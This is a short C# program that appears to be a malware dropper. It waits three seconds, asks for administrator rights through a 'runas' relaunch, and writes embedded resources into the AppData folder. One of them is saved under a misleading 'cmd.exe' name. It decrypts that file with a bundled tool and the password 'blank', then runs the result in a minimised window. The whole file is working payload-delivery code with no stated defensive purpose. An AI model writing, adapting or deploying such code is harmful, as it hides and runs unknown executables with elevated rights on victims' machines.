using System;
using System.Reflection;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Security.Principal;

class program
{
	static bool RunningAsAdmin() 
    {
        WindowsIdentity id = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(id);

        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }
	
	static void WriteResourceToFile(string resourceName, string fileName)
	{
		using(var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
		{
			using(var file = new FileStream(fileName, FileMode.Create, FileAccess.Write))
			{
				resource.CopyTo(file);
			} 
		}
	}
	
	static void RelaunchIfNotAdmin()
    {
        if (!RunningAsAdmin())
        {
            ProcessStartInfo proc = new ProcessStartInfo();
            proc.UseShellExecute = true;
            proc.WorkingDirectory = Environment.CurrentDirectory;
            proc.FileName = Assembly.GetEntryAssembly().CodeBase;
            proc.Verb = "runas";
            try
            {
                Process.Start(proc);
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Environment.Exit(0);
            }
        }
    }
	
	static void Main()
	{
		Thread.Sleep(3000);
		RelaunchIfNotAdmin();
		string temp = Environment.GetEnvironmentVariable("appdata");
		WriteResourceToFile("fsutil.exe", temp + "/cmd.exe.aes");
		WriteResourceToFile("a.es", temp + "/a.es");
		Process.Start("cmd.exe", "/c start /MIN \"\" \"%appdata%/a.es\" -d -p blank \"%appdata%/cmd.exe.aes\"");
		Process.Start("cmd.exe", "/c start /MIN \"\" \"%appdata%/cmd.exe\"");
	}
}